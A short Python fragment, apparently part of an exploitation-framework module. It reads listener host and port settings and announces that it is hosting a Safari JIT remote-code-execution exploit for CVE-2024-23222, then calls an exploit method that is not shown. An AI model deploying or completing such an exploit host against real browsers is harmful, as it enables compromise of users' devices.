        try:
            from core.database import DatabaseManagment
            db = DatabaseManagment.get()
        except ImportError:
            db = {}

        self.lhost = db.get("LHOST", "0.0.0.0")
        self.lport = int(db.get("LPORT", "8084"))

        print(f"[*] CVE-2024-23222: Safari JIT RCE Hoster")
        print(f"[*] Hosting exploit on: http://{self.lhost}:{self.lport}/")

        self.exploit()

